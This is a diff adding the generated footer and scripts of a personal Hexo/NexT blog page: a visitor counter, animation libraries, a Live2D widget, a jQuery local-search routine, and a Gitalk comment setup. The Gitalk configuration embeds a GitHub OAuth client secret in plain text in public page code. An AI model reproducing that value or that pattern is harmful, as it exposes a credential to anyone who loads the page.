+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jacky Cheng</span>
+
+  
+</div>
+
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 本站访问
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+
+    
+      <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+      <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+      <script type="text/javascript" src="/js/src/fireworks.js"></script>
+    
+
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'ee53cc5de9d57711e0cb',
+          clientSecret: '46a58ced62224ebedbadafff96c5860f097e9d66',
+          repo: 'CJJKKK.github.io',
+          owner: 'CJJKKK',
+          admin: ['CJJKKK'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false}});</script></body>
+</html>
